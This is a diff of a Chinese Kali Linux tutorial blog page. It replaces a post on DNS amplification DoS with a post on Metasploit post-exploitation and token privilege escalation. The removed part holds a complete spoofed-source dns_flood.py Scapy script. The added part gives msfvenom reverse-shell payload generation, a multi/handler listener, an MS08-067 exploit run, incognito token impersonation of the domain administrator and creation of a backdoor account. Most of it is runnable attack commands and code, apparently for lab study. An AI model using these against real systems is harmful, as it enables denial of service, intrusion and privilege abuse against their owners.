@@ -79,18 +79,16 @@
 
 
 
-<meta name="description" content="1. DNS放大攻击 产生大流量的攻击方法 单机的带宽优势 巨大单机数量形成的流量汇聚 利用协议特性实现放大效果的流量   DNS协议放大效果 查询请求流量小，但响应流量可能非常巨大 🔺命令：dig hp.com @202.96.134.133（流量放大约8倍）   攻击原理 伪造源地址为被攻击目标地址，向递归域名查询服务器发起查询 DNS服务器成为流量放大和实施攻击者，大量DNS服务器实现D">
+<meta name="description" content="1. Msf后渗透测试阶段 已经获得目标系统控制权后扩大战果 提权 信息收集 渗透内网 永久后门   实验环境 Window 7 网卡模式为Bridge模式，检查网络，🔺命令：ifconfig查看IP地址 关闭防火墙   Kali 网卡模式为Bridge模式，检查网络，🔺命令：ifconfig查看IP地址      2. 基于已有session扩大战果 Kali 🔺命令：msfvenom">
 <meta name="keywords" content="安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kali Linux笔记(八十三)：DoS--DNS放大">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;09&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%89)%EF%BC%9ADoS--DNS%E6%94%BE%E5%A4%A7&#x2F;index.html">
+<meta property="og:title" content="Kali Linux笔记(一百零八)：MSF后渗透测试--Token提权">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;03&#x2F;03&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AB)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Token%E6%8F%90%E6%9D%83&#x2F;index.html">
 <meta property="og:site_name" content="Tomas&#39;Blog">
-<meta property="og:description" content="1. DNS放大攻击 产生大流量的攻击方法 单机的带宽优势 巨大单机数量形成的流量汇聚 利用协议特性实现放大效果的流量   DNS协议放大效果 查询请求流量小，但响应流量可能非常巨大 🔺命令：dig hp.com @202.96.134.133（流量放大约8倍）   攻击原理 伪造源地址为被攻击目标地址，向递归域名查询服务器发起查询 DNS服务器成为流量放大和实施攻击者，大量DNS服务器实现D">
+<meta property="og:description" content="1. Msf后渗透测试阶段 已经获得目标系统控制权后扩大战果 提权 信息收集 渗透内网 永久后门   实验环境 Window 7 网卡模式为Bridge模式，检查网络，🔺命令：ifconfig查看IP地址 关闭防火墙   Kali 网卡模式为Bridge模式，检查网络，🔺命令：ifconfig查看IP地址      2. 基于已有session扩大战果 Kali 🔺命令：msfvenom">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=1503nDLGqXjIwmENcYCXt4Hkr5EAHJ9BLqjW16FyV1IYRnOO9gMW-0cVSvDhjyIdj_lTF19VL0yhWg7vnX-l0r-w6pYB6smOI_-nfpJc0ibm1xUZRlvb_2F6TgSdoCJn&amp;file_name=&#x2F;DNS%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB.PNG">
-<meta property="og:updated_time" content="2020-02-10T13:15:49.262Z">
+<meta property="og:updated_time" content="2020-03-03T07:08:49.262Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=1503nDLGqXjIwmENcYCXt4Hkr5EAHJ9BLqjW16FyV1IYRnOO9gMW-0cVSvDhjyIdj_lTF19VL0yhWg7vnX-l0r-w6pYB6smOI_-nfpJc0ibm1xUZRlvb_2F6TgSdoCJn&amp;file_name=&#x2F;DNS%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB.PNG">
 
 
 
@@ -120,13 +118,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/02/09/Kali Linux笔记(八十三)：DoS--DNS放大/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/03/03/Kali Linux笔记(一百零八)：MSF后渗透测试--Token提权/"/>
 
 
 
 
 
-  <title>Kali Linux笔记(八十三)：DoS--DNS放大 | Tomas'Blog</title>
+  <title>Kali Linux笔记(一百零八)：MSF后渗透测试--Token提权 | Tomas'Blog</title>
   
 
 
@@ -245,7 +243,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%89)%EF%BC%9ADoS--DNS%E6%94%BE%E5%A4%A7/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AB)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Token%E6%8F%90%E6%9D%83/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Tomas">
@@ -262,7 +260,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(八十三)：DoS--DNS放大</h1>
+          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(一百零八)：MSF后渗透测试--Token提权</h1>
         
 
         <div class="post-meta">
@@ -274,8 +272,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-09T23:49:58+08:00">
-                2020-02-09
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-03T15:31:17+08:00">
+                2020-03-03
               </time>
             
 
@@ -328,7 +326,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  488 字
+                  785 字
                 </span>
               
 
@@ -344,7 +342,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  2 分钟
+                  3 分钟
                 </span>
               
             </div>
@@ -366,71 +364,136 @@
 
       
         <hr>
-<h4 id="1-DNS放大攻击"><a href="#1-DNS放大攻击" class="headerlink" title="1. DNS放大攻击"></a>1. DNS放大攻击</h4><ul>
-<li>产生大流量的攻击方法<ul>
-<li>单机的带宽优势</li>
-<li>巨大单机数量形成的流量汇聚</li>
-<li>利用协议特性实现放大效果的流量</li>
+<h4 id="1-Msf后渗透测试阶段"><a href="#1-Msf后渗透测试阶段" class="headerlink" title="1. Msf后渗透测试阶段"></a>1. Msf后渗透测试阶段</h4><ul>
+<li>已经获得目标系统控制权后扩大战果<ul>
+<li>提权</li>
+<li>信息收集</li>
+<li>渗透内网</li>
+<li>永久后门</li>
 </ul>
 </li>
-<li>DNS协议放大效果<ul>
-<li>查询请求流量小，但响应流量可能非常巨大</li>
-<li><strong><code>🔺命令：dig hp.com @202.96.134.133</code></strong>（流量放大约8倍）</li>
+<li>实验环境<ul>
+<li>Window 7<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li>关闭防火墙</li>
 </ul>
 </li>
-<li>攻击原理<ul>
-<li>伪造源地址为被攻击目标地址，向递归域名查询服务器发起查询</li>
-<li>DNS服务器成为流量放大和实施攻击者，大量DNS服务器实现DDoS</li>
+<li>Kali<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
 </ul>
 </li>
 </ul>
-<h4 id="2-Scapy构造攻击数据包"><a href="#2-Scapy构造攻击数据包" class="headerlink" title="2. Scapy构造攻击数据包"></a>2. Scapy构造攻击数据包</h4><ul>
-<li>Kali开启Wireshark抓包，监听Kali的IP地址</li>
-<li>IP/UDP/DNS/DNS查询内容</li>
-<li>IP头构造<ul>
-<li>i=IP()</li>
-<li>i.dst=”202.96.134.133”</li>
-<li>i.src=”被攻击者的IP”</li>
-<li>i.display()</li>
+</li>
+</ul>
+<h4 id="2-基于已有session扩大战果"><a href="#2-基于已有session扩大战果" class="headerlink" title="2. 基于已有session扩大战果"></a>2. 基于已有session扩大战果</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 7 -f exe -o 1.exe</code></strong></li>
+<li><strong><code>🔺命令：service apache2 start</code></strong></li>
+<li><strong><code>🔺命令：cp 1.exe /var/www/html</code></strong></li>
+<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
+<li><strong><code>🔺命令：use exploit/multi/handler</code></strong><ul>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong></li>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
 </ul>
 </li>
-<li>UDP头构造<ul>
-<li>u=udp()</li>
-<li>u.display()</li>
 </ul>
 </li>
-<li>DNS头构造<ul>
-<li>d=DNS()</li>
-<li>d.rd=1（递归查询）</li>
-<li>d.qdount=1</li>
-<li>d.display()</li>
+<li>Window 7<ul>
+<li>浏览器访问<a href="http://Kali的IP，下载保存1.exe" target="_blank" rel="noopener">http://Kali的IP，下载保存1.exe</a></li>
+<li>双击打开1.exe</li>
 </ul>
 </li>
-<li>DNS内容构造<ul>
-<li>q=DNSQR()</li>
-<li>q.qname=”hp.com”</li>
-<li>q.qtype=255（A为默认记录，255即查所有记录）</li>
-<li>q.display()</li>
+<li>Kali<ul>
+<li>查看是否拿到shell</li>
+<li><strong><code>🔺命令：session -l</code></strong></li>
 </ul>
 </li>
-<li>拼接数据<ul>
-<li>d.qd=q</li>
-<li>d.display()</li>
+</ul>
+<h4 id="3-获取system账号权限"><a href="#3-获取system账号权限" class="headerlink" title="3. 获取system账号权限"></a>3. 获取system账号权限</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：load priv</code></strong> </li>
+<li><strong><code>🔺命令：getsystem</code></strong> <ul>
+<li>priv_elevate_getsystem: Operation failed: Access is denied. </li>
+<li>priv_elevate_getsystem: Operation failed: The enviroment is incorrect.</li>
 </ul>
 </li>
-<li>发送数据包<ul>
-<li>r=(i/u/d)</li>
-<li>r.display()</li>
-<li>sr1(r)</li>
-<li>▲ 发包：send(r)（可用Kali进行发包，物理机进行接收数据包）</li>
 </ul>
 </li>
-<li>▲ 结合IP地址欺骗，利用大量DNS服务器做傀儡攻击目标</li>
-<li><strong><code>🔺命令：./dns_flood.py 被攻击者的IP hp.com 20</code></strong></li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#_*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">from scapy.all import *</span><br><span class="line">from time import sleep</span><br><span class="line">import thread</span><br><span class="line">import random</span><br><span class="line">import logging</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 4:</span><br><span class="line">    print &quot;用法：./dns_flood.py [IP地址] [利用的域名] [线程数]&quot;</span><br><span class="line">    print &quot;举例：./dns_flood.py 1.1.1.1 hp.com 20&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">target = str(sys.argv[1])</span><br><span class="line">dnsname = str(sys.argv[2])</span><br><span class="line">threads = int(sys.argv[3])</span><br><span class="line"></span><br><span class="line">print &quot;正在执行 DNS Flood 攻击，按 Ctrl+C 停止攻击&quot;</span><br><span class="line">def dnsflood(target,dnsname):</span><br><span class="line">    while 0 == 0:</span><br><span class="line">        x = random.randint(0,65535)</span><br><span class="line">        send(IP(dst=&quot;202.96.134.133&quot;,src=target)/UDP(sport=x,dport=53)/DNS(rd=1,qdcount=1,qd=DNSQR(qname=dnsname,qtype=255)),verbose=0)</span><br><span class="line"></span><br><span class="line">for x in range(0,threads):</span><br><span class="line">    thread.start_new_thread(dnsflood,(target,dnsname))</span><br><span class="line"></span><br><span class="line">while 0 == 0:</span><br><span class="line">    sleep(1)</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=1503nDLGqXjIwmENcYCXt4Hkr5EAHJ9BLqjW16FyV1IYRnOO9gMW-0cVSvDhjyIdj_lTF19VL0yhWg7vnX-l0r-w6pYB6smOI_-nfpJc0ibm1xUZRlvb_2F6TgSdoCJn&file_name=/DNS%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB.PNG" alt="DNS放大攻击"></p>
+<h4 id="4-Token提权"><a href="#4-Token提权" class="headerlink" title="4. Token提权"></a>4. Token提权</h4><ul>
+<li>Tokens<ul>
+<li>用户每次登陆，账号绑定临时的Token</li>
+<li>访问资源时提价Token进行身份验证，类似于WEB Cookie</li>
+<li>Delegate Token：交互登陆会话（windowd的登陆界面、远程桌面）</li>
+<li>Impersonate Token：非交互登陆会话（SMB协议访问文件共享目录）</li>
+<li>Delegate Token：账号注销后变为Impersonate Token，权限依然有效<ul>
+<li>▲ 域管理员登陆注销后，依然依存这Token</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Incognito<ul>
+<li>独立功能的软件，被MSF集成在meterpreter中</li>
+<li>无需密码破解或获取密码HASH，窃取Token将自己伪装成其他用户</li>
+<li>尤其适用于域环境下提权渗透多操作系统</li>
+</ul>
+</li>
+<li>搭建域环境<ul>
+<li>▲ 2020.03.03 因搭建实验环境需要重启启动机器+硬盘空间所剩不足+XP和2003的有效期已经过了，故这次实验先暂且放一放</li>
+<li>Window Server 2003<ul>
+<li>配置静态IP地址，DNS服务器指向自己</li>
+<li>运行域程序的安装：dcpromo（安装过程需要光盘）</li>
+<li>DNS全名：lab.com</li>
+<li>重新启动服务器</li>
+<li>分配域账号（无本地用户） → dsa.msc → lab.com → Users → 右键 → 新建普通用户u1 → 设置账户密码（域的密码要复杂，需包含大写字母，小写字母，数字，特殊字符其中三种，且长度长于7个字符）</li>
+</ul>
+</li>
+<li>Window XP SP3<ul>
+<li>关闭防火墙 → 配置静态IP地址（DNS指向域控制器）</li>
+<li>我的电脑 → 右键 → 属性 → 高级系统设置 → 计算机名 → 更改 → 指定域（lab.com）</li>
+<li>重新启动机器</li>
+<li>用域账号Administrator登陆，关闭防火墙</li>
+<li>再用域账号u1登陆</li>
+</ul>
+</li>
+<li>Window Server 2003<ul>
+<li>Win+R → \Window XP SP3的IP\c$ → 进行操作</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong><ul>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+</ul>
+</li>
+<li><strong><code>🔺命令：set RHOST Window XP SP3的IP</code></strong></li>
+<li><strong><code>🔺命令：set target 34</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+<li><strong><code>🔺命令：getuid</code></strong></li>
+<li><strong><code>🔺命令：load incognito</code></strong><ul>
+<li>使用伪装Token需要提权为本地SYSTEM权限</li>
+<li>查看组的Token：<strong><code>🔺命令：list_tokens -u</code></strong></li>
+<li>伪装Token：<strong><code>🔺命令：impersonate_token lab\\administrator</code></strong></li>
+</ul>
+</li>
+<li><strong><code>🔺命令：getuid</code></strong></li>
+<li><strong><code>🔺命令：execute -f cmd.exe -i -t</code></strong> # -t：使用当前假冒token执行程序</li>
+<li><strong><code>🔺命令：shell</code></strong><ul>
+<li><strong><code>🔺命令：net user a a /add</code></strong>（增加账号尝试）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>▲ 本地普通权限用户需先本地提权<ul>
+<li><strong><code>🔺命令：use exploit/windows/local/ms10_015_kitrap0d</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
 
       
     </div>
@@ -461,8 +524,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%BA%8C)%EF%BC%9ATearDrop/" rel="next" title="Kali Linux笔记(八十二)：TearDrop">
-                <i class="fa fa-chevron-left"></i> Kali Linux笔记(八十二)：TearDrop
+              <a href="/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%83)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--UAC%E6%8F%90%E6%9D%83/" rel="next" title="Kali Linux笔记(一百零七)：MSF后渗透测试--UAC提权">
+                <i class="fa fa-chevron-left"></i> Kali Linux笔记(一百零七)：MSF后渗透测试--UAC提权
               </a>
             
           </div>
@@ -470,10 +533,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/02/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%9B%9B)%EF%BC%9ADoS--SNMP%E6%94%BE%E5%A4%A7/" rel="prev" title="Kali Linux笔记(八十四)：DoS--SNMP放大">
-                Kali Linux笔记(八十四)：DoS--SNMP放大 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -643,7 +702,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-DNS放大攻击"><span class="nav-number">1.</span> <span class="nav-text">1. DNS放大攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-Scapy构造攻击数据包"><span class="nav-number">2.</span> <span class="nav-text">2. Scapy构造攻击数据包</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Msf后渗透测试阶段"><span class="nav-number">1.</span> <span class="nav-text">1. Msf后渗透测试阶段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-基于已有session扩大战果"><span class="nav-number">2.</span> <span class="nav-text">2. 基于已有session扩大战果</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-获取system账号权限"><span class="nav-number">3.</span> <span class="nav-text">3. 获取system账号权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-Token提权"><span class="nav-number">4.</span> <span class="nav-text">4. Token提权</span></a></li></ol></div>
             
 
           </div>
